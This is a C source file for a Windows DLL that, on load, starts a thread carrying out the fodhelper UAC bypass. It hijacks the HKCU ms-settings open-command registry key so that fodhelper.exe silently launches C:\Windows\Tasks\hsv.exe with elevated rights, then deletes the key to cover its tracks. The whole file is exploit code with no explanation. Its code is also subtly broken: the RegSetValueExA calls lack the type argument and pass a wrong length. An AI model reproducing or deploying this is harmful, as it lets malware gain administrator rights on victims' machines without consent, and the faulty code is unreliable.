#include <windows.h> 




DWORD WINAPI ex(LPVOID)
{
    HKEY key;
    const char *path = "C:\\Windows\\Tasks\\hsv.exe";
    RegCreateKeyA(HKEY_CURRENT_USER,"Software\\Classes\\ms-settings\\Shell\\Open\\command",&key);
    RegSetValueExA(key,"DelegateExecute",0,(const BYTE*)"",strlen("")+1);
    RegSetValueExA(key,NULL,0,(const BYTE*)path,strlen("")+1);
    RegCloseKey(key);
    ShellExecuteA(NULL,"open","fodhelper.exe",NULL,NULL,SW_HIDE);
    Sleep(2000);
    RegDeleteTreeW(HKEY_CURRENT_USER,L"Software\\Classes\\ms-settings\\Shell\\Open\\command");

    return 0;
}





BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    if(reason == DLL_PROCESS_ATTACH)
    {
        CreateThread(NULL,0,ex,NULL,0,NULL);
        
    }
    return TRUE;

}